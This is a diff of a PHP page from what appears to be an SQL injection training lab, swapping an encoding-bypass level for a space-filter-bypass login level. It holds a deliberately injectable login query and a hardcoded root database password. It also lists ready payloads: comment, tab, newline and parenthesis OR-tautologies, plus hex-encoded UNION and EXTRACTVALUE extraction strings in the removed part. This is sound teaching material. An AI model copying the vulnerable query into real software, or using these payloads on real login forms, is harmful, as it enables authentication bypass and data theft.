@@ -1,34 +1,68 @@
 <?php
-$mysqli = new mysqli('db','root','rootpassword','sqli_lab');
-$id = $_GET['id'] ?? '';
+// Level 15: Space Filter Bypass - No Spaces Allowed
+// Goal: Bypass space character filtering in SQL injection
 
-// URL decode and check for blocked keywords
-if ($id !== '') {
-    $decoded_id = urldecode($id);
-    $blocked_keywords = ['union', 'select', 'or', 'and', 'script', 'javascript'];
-    $id_lower = strtolower($decoded_id);
+session_start();
 
-    $blocked = false;
-    foreach ($blocked_keywords as $keyword) {
-        if (strpos($id_lower, $keyword) !== false) {
-            $blocked = true;
-            break;
-        }
-    }
+// Database connection
+$host = $_ENV['DB_HOST'] ?? 'db';
+$user = $_ENV['DB_USER'] ?? 'root'; 
+$pass = $_ENV['DB_PASS'] ?? 'rootpassword';
+$dbname = $_ENV['DB_NAME'] ?? 'sqli_lab';
 
-    if (!$blocked) {
-        $sql = "SELECT username FROM users WHERE id = $decoded_id";
-        $result = $mysqli->query($sql);
+$conn = new mysqli($host, $user, $pass, $dbname);
 
-        if (!$result) {
-            die('Error: '.$mysqli->error);
-        }
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
 
-        $row = $result->fetch_row();
-        if ($row) {
-            echo htmlspecialchars($row[0]);
-        } else {
-            echo 'No user found';
+$message = "";
+$success = false;
+$detected_spaces = false;
+
+if ($_POST) {
+    $username = $_POST['username'] ?? '';
+    $password = $_POST['password'] ?? '';
+    
+    // Check for space characters
+    if (strpos($username, ' ') !== false || strpos($password, ' ') !== false) {
+        $detected_spaces = true;
+        $message = "🚫 Security Filter: Space characters are not allowed!<br>";
+        $message .= "❌ Detected spaces in: ";
+        $space_locations = [];
+        if (strpos($username, ' ') !== false) $space_locations[] = "username";
+        if (strpos($password, ' ') !== false) $space_locations[] = "password";
+        $message .= implode(', ', $space_locations) . "<br>";
+        $message .= "🛡️ Try alternative space bypasses!";
+    } else {
+        // VULNERABLE query (if space filter is bypassed)
+        $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
+        
+        try {
+            $result = $conn->query($sql);
+            
+            if ($result && $result->num_rows > 0) {
+                $user_data = $result->fetch_assoc();
+                
+                if ($user_data['role'] === 'admin') {
+                    $success = true;
+                    $message = "🎉 Exceptional! You bypassed space filtering like a pro!<br>";
+                    $message .= "🏁 <strong>FLAG: LEVEL15_SPACE_BYPASS_MASTER</strong><br>";
+                    $message .= "🚀 No spaces detected in payload!<br>";
+                    $message .= "📝 SQL Query: <code>" . htmlspecialchars($sql) . "</code><br>";
+                    $message .= "👑 Admin access achieved without spaces!";
+                } else {
+                    $message = "✅ Login successful as: " . htmlspecialchars($user_data['username']) . " (" . htmlspecialchars($user_data['role']) . ")";
+                    $message .= "<br>⚠️ You need admin role to get the flag!";
+                }
+            } else {
+                $message = "❌ Authentication failed: No matching user found";
+                $message .= "<br>📝 SQL Query: <code>" . htmlspecialchars($sql) . "</code>";
+            }
+            
+        } catch (Exception $e) {
+            $message = "💥 SQL Error: " . $e->getMessage();
+            $message .= "<br>📝 SQL Query: <code>" . htmlspecialchars($sql) . "</code>";
         }
     }
 }
@@ -39,153 +73,199 @@ if ($id !== '') {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Level 15 - Encoding Bypass</title>
+    <title>Level 15 - Space Filter Bypass | SQL Injection Lab</title>
     <link rel="stylesheet" href="css/styles.css">
+    <style>
+        .space-container {
+            max-width: 750px;
+            margin: 2rem auto;
+            background: #18181b;
+            color: #e2e8f0;
+            padding: 2rem;
+            border-radius: 16px;
+            box-shadow: 0 8px 25px rgba(24, 24, 27, 0.4);
+            border: 1px solid #ef4444;
+        }
+        
+        .space-info {
+            background: #0a0a0a;
+            border: 2px solid #ef4444;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #fca5a5;
+        }
+        
+        .bypass-techniques {
+            background: #0a0a0a;
+            border: 2px solid #ef4444;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            color: #fca5a5;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+        }
+        
+        .technique {
+            margin: 0.5rem 0;
+            padding: 0.5rem;
+            background: #1f1f23;
+            border-radius: 4px;
+            border-left: 3px solid #ef4444;
+        }
+        
+        .form-group input {
+            background: #0a0a0a;
+            color: #e2e8f0;
+            border: 2px solid #ef4444;
+        }
+        
+        .form-group input:focus {
+            border-color: #f87171;
+            box-shadow: 0 0 0 3px rgba(248, 113, 113, 0.2);
+        }
+        
+        .submit-btn {
+            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .submit-btn:hover {
+            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
+        }
+        
+        .space-detector {
+            background: #1f1f23;
+            border: 2px solid #f87171;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            text-align: center;
+            font-weight: bold;
+            color: #fca5a5;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #18181b 100%);
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🔤 Level 15 - Encoding Bypass</h1>
-            <p><strong>Attack Type:</strong> Use various encoding techniques to bypass character-based filters</p>
+            <h1>🚫 Level 15 - Space Filter Bypass</h1>
+            <p>Exploit SQL injection without using space characters</p>
+            <a href="index.php" class="back-btn">← Back to Labs</a>
         </div>
-
-        <div class="form-container">
-            <h3>Current Query:</h3>
-            <div class="code-block">SELECT username FROM users WHERE id = <?php 
-            $id = $_GET['id'] ?? 'NULL';
-            echo htmlspecialchars(urldecode($id));
-            ?></div>
-            
-            <h3>🚨 Filter Rules:</h3>
-            <div class="waf-warning">
-                <strong>Process:</strong> URL decode → Check blocked keywords<br>
-                <strong>Blocked keywords:</strong> union, select, or, and, script, javascript
+        
+        <div class="space-container">
+            <div class="space-info">
+                <h4>🚫 Space Filter Challenge</h4>
+                <p>This system blocks all inputs containing space characters.</p>
+                <p><strong>Goal:</strong> Achieve SQL injection without using any spaces!</p>
             </div>
             
-            <?php
-            if (isset($_GET['id']) && $_GET['id'] !== '') {
-                $id = $_GET['id'];
-                $decoded_id = urldecode($id);
-                
-                echo '<h3>Result:</h3>';
-                echo '<div class="result">';
-                echo '<p><strong>Original input:</strong> ' . htmlspecialchars($id) . '</p>';
-                echo '<p><strong>After URL decode:</strong> ' . htmlspecialchars($decoded_id) . '</p>';
-                
-                $blocked_keywords = ['union', 'select', 'or', 'and', 'script', 'javascript'];
-                $id_lower = strtolower($decoded_id);
-
-                $blocked = false;
-                $blocked_keyword = '';
-                foreach ($blocked_keywords as $keyword) {
-                    if (strpos($id_lower, $keyword) !== false) {
-                        $blocked = true;
-                        $blocked_keyword = $keyword;
-                        break;
-                    }
-                }
-
-                if ($blocked) {
-                    echo '<div class="error">🚨 Filter blocked: Keyword detected: ' . $blocked_keyword . '</div>';
-                } else {
-                    $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
-                    $sql = "SELECT username FROM users WHERE id = $decoded_id";
-                    $result = $mysqli->query($sql);
-
-                    if (!$result) {
-                        echo '<div class="error">Error: '.$mysqli->error.'</div>';
-                    } else {
-                        $row = $result->fetch_row();
-                        if ($row) {
-                            echo '<strong>Username:</strong> ' . htmlspecialchars($row[0]);
-                        } else {
-                            echo 'No user found';
-                        }
-                    }
-                }
-                echo '</div>';
-            }
-            ?>
+            <div class="space-detector">
+                🔍 SPACE CHARACTER DETECTOR ACTIVE 🔍<br>
+                All inputs will be scanned for space characters (ASCII 32)
+            </div>
             
-            <h3>🔧 Try Your Own Payload:</h3>
-            <form method="get" style="margin: 20px 0;">
+            <div class="bypass-techniques">
+                <strong>🛠️ Space Bypass Techniques:</strong><br>
+                
+                <div class="technique">
+                    <strong>1. Tab Character:</strong><br>
+                    admin'/**/OR/**/'x'='x → admin'	OR	'x'='x
+                </div>
+                
+                <div class="technique">
+                    <strong>2. Newline Characters:</strong><br>
+                    admin'%0AOR%0A'x'='x → admin'<br>OR<br>'x'='x
+                </div>
+                
+                <div class="technique">
+                    <strong>3. Comment-based Spacing:</strong><br>
+                    admin'/**/OR/**/'x'='x → admin'/*comment*/OR/*comment*/'x'='x
+                </div>
+                
+                <div class="technique">
+                    <strong>4. Parentheses Grouping:</strong><br>
+                    admin'OR('x'='x') → admin'OR('x'='x')
+                </div>
+                
+                <div class="technique">
+                    <strong>5. Plus Sign (URL encoded):</strong><br>
+                    admin'+OR+'x'='x → admin' OR 'x'='x
+                </div>
+            </div>
+            
+            <?php if ($message): ?>
+                <div class="message <?= $success ? 'success' : 'error' ?>">
+                    <?= $message ?>
+                </div>
+            <?php endif; ?>
+            
+            <h3>🔐 Space-Free Login</h3>
+            <form method="POST" class="login-form">
                 <div class="form-group">
-                    <label for="id">ID Parameter:</label>
-                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
+                    <label for="username">Username:</label>
+                    <input type="text" id="username" name="username" placeholder="Enter username (NO SPACES!)" required>
                 </div>
-                <button type="submit" class="btn">🚀 Execute Query</button>
+                
+                <div class="form-group">
+                    <label for="password">Password:</label>
+                    <input type="text" id="password" name="password" placeholder="Enter password (NO SPACES!)" required>
+                </div>
+                
+                <button type="submit" class="submit-btn">🚀 Login</button>
             </form>
+        </div>
+        
+        <div class="hints">
+            <h3>💡 Hints for Level 15:</h3>
+            <ul>
+                <li><strong>Challenge:</strong> No space characters (ASCII 32) allowed</li>
+                <li><strong>Goal:</strong> Inject SQL without spaces</li>
+                <li><strong>Example Payloads:</strong></li>
+            </ul>
+            <div class="code-example">
+<strong>Method 1 - Comments:</strong><br>
+Username: admin'/**/OR/**/'x'='x<br>
+Password: anything<br><br>
 
-            <div class="hint-container">
-                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
-                <div id="hint-1" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 1: Understanding URL Encoding</h4>
-                    <p>The filter URL decodes the input before checking for keywords.</p>
-                    <p>Try: <code>1%20union</code> - This decodes to "1 union" and gets blocked.</p>
-                    <p>We need double encoding or alternative methods.</p>
-                </div>
-                <div id="hint-2" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 2: Double URL Encoding</h4>
-                    <p>Try double encoding to bypass single decode:</p>
-                    <p>Try: <code>1%2520union</code> (double encoded space + union)</p>
-                    <p>This decodes to "1%20union" which may not be detected as containing "union".</p>
-                </div>
-                <div id="hint-3" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 3: Hex Encoding</h4>
-                    <p>Use hex encoding for individual characters:</p>
-                    <p>Try: <code>1%20%75%6e%69%6f%6e</code> (hex for "union")</p>
-                    <p>u=75, n=6e, i=69, o=6f, n=6e</p>
-                </div>
-                <div id="hint-4" class="hint-box" style="display: none;">
-                    <h4>💡 Hint 4: Using Functions Without Keywords</h4>
-                    <p>Since encoding might still be decoded, use functions:</p>
-                    <p>Try: <code>1%20%4f%52%20%28%41%53%43%49%49%28%4d%49%44%28%28%44%41%54%41%42%41%53%45%28%29%29%2c%31%2c%31%29%29%3e%31%30%30%29</code></p>
-                    <p>This is hex encoded: "OR (ASCII(MID((DATABASE()),1,1))>100)"</p>
-                </div>
-                <div id="hint-5" class="hint-box" style="display: none;">
-                    <h4>🎯 Final Payload</h4>
-                    <p>Extract the flag using hex encoding:</p>
-                    <p><code>-1%20%4f%52%20%45%58%54%52%41%43%54%56%41%4c%55%45%28%31%2c%43%4f%4e%43%41%54%28%30%78%37%65%2c%28%4d%49%44%28%28%4d%49%44%28%28%44%41%54%41%42%41%53%45%28%29%29%2c%31%2c%31%30%30%29%29%2c%31%2c%35%30%29%29%2c%30%78%37%65%29%29</code></p>
-                    <p>This decodes to an EXTRACTVALUE payload that extracts database info.</p>
-                    <p>For the flag specifically:</p>
-                    <p><code>-1%20%4f%52%20%28%41%53%43%49%49%28%53%55%42%53%54%52%49%4e%47%28%28%53%45%4c%45%43%54%20%66%6c%61%67%20%46%52%4f%4d%20%6c%65%76%65%6c%73%20%57%48%45%52%45%20%69%64%3d%31%35%29%2c%31%2c%31%29%29%3e%36%30%29</code></p>
-                </div>
+<strong>Method 2 - Tab Characters:</strong><br>
+Username: admin'	OR	'x'='x<br>
+Password: anything<br><br>
+
+<strong>Method 3 - Newlines (URL encoded):</strong><br>
+Username: admin'%0AOR%0A'x'='x<br>
+Password: anything<br><br>
+
+<strong>Method 4 - Parentheses:</strong><br>
+Username: admin'OR('x'='x')<br>
+Password: anything
             </div>
+            <ul>
+                <li><strong>Advanced:</strong> Try combining multiple techniques</li>
+                <li><strong>Remember:</strong> The goal is to bypass the password check entirely</li>
+                <li><strong>Tip:</strong> Copy-paste tab characters from text editor if needed</li>
+            </ul>
         </div>
         
         <div class="navigation">
-            <a href="index.php">🏠 Home</a>
-            <a href="level14.php">⬅️ Previous Level</a>
-            <a href="level16.php">➡️ Next Level</a>
-            <a href="submit.php?level=15">🏆 Submit Flag</a>
+            <a href="level14.php">← Previous Level</a>
+            <a href="level16.php">Next Level →</a>
         </div>
     </div>
-
-    <script>
-    let currentHint = 0;
-    const maxHints = 5;
-
-    function updateQuery() {
-        const input = document.getElementById('id').value;
-        const codeBlock = document.querySelector('.code-block');
-        try {
-            const decoded = decodeURIComponent(input || 'NULL');
-            codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + decoded;
-        } catch(e) {
-            codeBlock.innerHTML = 'SELECT username FROM users WHERE id = ' + (input || 'NULL');
-        }
-    }
-
-    function showNextHint() {
-        if (currentHint < maxHints) {
-            currentHint++;
-            document.getElementById('hint-' + currentHint).style.display = 'block';
-            
-            if (currentHint >= maxHints) {
-                document.querySelector('.hint-btn').style.display = 'none';
-            }
-        }
-    }
-    </script>
 </body>
 </html>
+
+<?php $conn->close(); ?>
